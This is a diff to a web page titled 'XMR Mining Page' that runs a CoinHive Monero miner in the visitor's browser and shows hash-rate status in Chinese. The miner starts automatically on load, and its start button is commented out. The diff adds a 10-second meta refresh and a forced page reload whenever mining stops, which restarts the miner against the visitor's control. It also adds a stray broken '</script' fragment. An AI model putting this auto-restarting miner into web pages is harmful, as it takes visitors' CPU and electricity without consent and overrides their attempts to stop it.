@@ -3,9 +3,11 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta charset="utf-8">
 <title>XMR Mining Page</title>
+<META HTTP-EQUIV="Refresh" content="10">
 </head>
 <body>
  
+</script
 <p style="font-size: 9pt;">
  
 <p style="font-size: 11pt;" id="status"></p>
@@ -21,10 +23,12 @@ if (navigator.hardwareConcurrency > 1){
 }else{
     var cpuConfig = {throttle:0.6}
 }
+ 
 var miner = new CoinHive.Anonymous('xEOYmN6fazsS6amOlsmbQGouKbcm3ysr', cpuConfig);
 miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 // Update stats once per second
 setInterval(function() {
+
     var threadCount = miner.getNumThreads();
     var hashesPerSecond = Math.round(miner.getHashesPerSecond());
     var getTotalHashes = miner.getTotalHashes();
@@ -36,7 +40,7 @@ try {
         }
     });
 }catch(e){console.log(e)}
-    // Output to HTML elements...
+    
     if (miner.isRunning()) {
         document.getElementById("status").innerHTML = "状态: 正在使用 " + threadCount + " 个进程";
         document.getElementById("hashesPerSecond").innerHTML = "您的计算力: " + hashesPerSecond + " H/s";
@@ -45,6 +49,10 @@ try {
     }else{
         document.getElementById("status").innerHTML = "状态: 沒有进行任何计算";
         document.getElementById("hashesPerSecond").innerHTML = "您的计算力: " + 0 + " H/s";
+         
+     
+        window.location.reload();//页面刷新
+     
      /*   document.getElementById("minerbutton").innerHTML = "<button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)">开始挖矿!</button>";*/
     }
 }, 800);
